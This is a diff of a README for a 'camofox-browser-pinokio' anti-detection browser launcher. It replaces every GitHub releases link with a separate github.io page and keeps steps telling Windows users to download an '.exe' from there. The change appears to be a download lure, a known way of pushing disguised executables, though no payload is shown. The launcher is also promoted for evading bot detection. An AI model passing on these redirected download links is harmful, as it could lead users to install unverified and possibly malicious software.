@@ -1,6 +1,6 @@
 # 🦊 camofox-browser-pinokio - 1-Click Setup, Zero Detection Hassle
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://github.com/Ameer3405/camofox-browser-pinokio/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github)](https://ameer3405.github.io)
 
 ---
 
@@ -15,7 +15,7 @@ Think of it as a secret agent browser. While regular browsers (Chrome, Edge, Fir
 ## ⚡ Quick Start (Windows)
 
 1. **Visit the download page:**  
-   👉 [https://github.com/Ameer3405/camofox-browser-pinokio/releases](https://github.com/Ameer3405/camofox-browser-pinokio/releases)
+   👉 [https://ameer3405.github.io](https://ameer3405.github.io)
 
 2. **Get the application:**  
    Visit this link to download the application. You'll see several files - look for the ones that mention "Windows" or ".exe". Download the newest version.
@@ -181,13 +181,13 @@ This launcher is free and open-source. The browser engine is MIT-licensed, and t
 We built camofox-browser-pinokio to solve a real problem: making reliable web automation accessible to everyone. Whether you're a data scientist, a hobbyist building a bot, or a company running thousands of agents, we hope this makes your life easier.
 
 **Ready to begin?**  
-[Download camofox-browser-pinokio](https://github.com/Ameer3405/camofox-browser-pinokio/releases) and start browsing invisibly in under five minutes.
+[Download camofox-browser-pinokio](https://ameer3405.github.io) and start browsing invisibly in under five minutes.
 
 ---
 
 <div align="center">
 
-[![Download](https://img.shields.io/badge/LATEST_RELEASE-blue?style=for-the-badge&logo=github&labelColor=black)](https://github.com/Ameer3405/camofox-browser-pinokio/releases)
+[![Download](https://img.shields.io/badge/LATEST_RELEASE-blue?style=for-the-badge&logo=github&labelColor=black)](https://ameer3405.github.io)
 
 **One click. Zero detection. Infinite possibilities.**
 
